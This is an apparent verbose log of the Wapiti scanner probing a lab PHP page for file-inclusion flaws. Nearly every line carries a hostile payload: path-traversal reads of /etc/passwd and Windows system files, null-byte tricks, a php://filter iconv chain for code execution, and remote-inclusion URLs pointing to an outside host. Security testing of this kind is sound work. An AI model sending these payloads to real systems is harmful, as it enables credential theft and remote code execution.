2024-03-20 16:49:38.225 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xss_get.php?lastname=fuzz&firstname=fuzz&form=submit (0)
2024-03-20 16:49:48.686 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.696 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit (1)
2024-03-20 16:49:48.710 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit (1)
2024-03-20 16:49:48.724 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=xss_get.php&form=submit (1)
2024-03-20 16:49:48.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=xss_get.php%00&form=submit (1)
2024-03-20 16:49:48.753 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=xss_get.php%3A%3A%24DATA&form=submit (1)
2024-03-20 16:49:48.764 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (1)
2024-03-20 16:49:48.778 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (1)
2024-03-20 16:49:48.793 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%2Fetc%2Fpasswd (1)
2024-03-20 16:49:48.807 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:48.821 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%2Fetc%2Fservices (1)
2024-03-20 16:49:48.836 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:48.846 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (1)
2024-03-20 16:49:48.854 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (1)
2024-03-20 16:49:48.864 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (1)
2024-03-20 16:49:48.873 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:48.882 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:48.891 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (1)
2024-03-20 16:49:48.901 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (1)
2024-03-20 16:49:48.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (1)
2024-03-20 16:49:48.919 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 16:49:48.928 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 16:49:48.937 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:48.947 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:48.955 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 16:49:48.965 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 16:49:48.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:48.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:48.997 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:49.011 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:49.025 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.039 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.055 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (1)
2024-03-20 16:49:49.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 16:49:49.079 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 16:49:49.088 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:49.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:49.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 16:49:49.116 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 16:49:49.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.135 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:49.153 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:49.163 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.171 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.181 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 16:49:49.190 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
2024-03-20 16:49:49.200 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:49.210 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:49.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 16:49:49.227 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
2024-03-20 16:49:49.237 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.253 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.269 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:49.284 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:49.300 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.317 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.335 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=file%3A%2F%2F%2Fetc%2Fpasswd (1)
2024-03-20 16:49:49.353 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (1)
2024-03-20 16:49:49.370 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (1)
2024-03-20 16:49:49.387 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (1)
2024-03-20 16:49:49.404 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (1)
2024-03-20 16:49:49.422 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.439 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
2024-03-20 16:49:49.457 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
2024-03-20 16:49:49.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=xss_get.php (1)
2024-03-20 16:49:49.491 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=xss_get.php%00 (1)
2024-03-20 16:49:49.509 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/xss_get.php?firstname=default&lastname=default&form=xss_get.php%3A%3A%24DATA (1)
2024-03-20 16:49:49.538 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xss_get.php (1)
2024-03-20 16:49:49.551 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xss_get.php (1)
	data: form_bug=&bug=48
2024-03-20 16:49:49.555 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&bug=48
2024-03-20 16:49:49.563 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&bug=48
2024-03-20 16:49:49.570 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
	data: form_bug=%2Fetc%2Fpasswd&bug=48
2024-03-20 16:49:49.578 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xss_get.php (1)
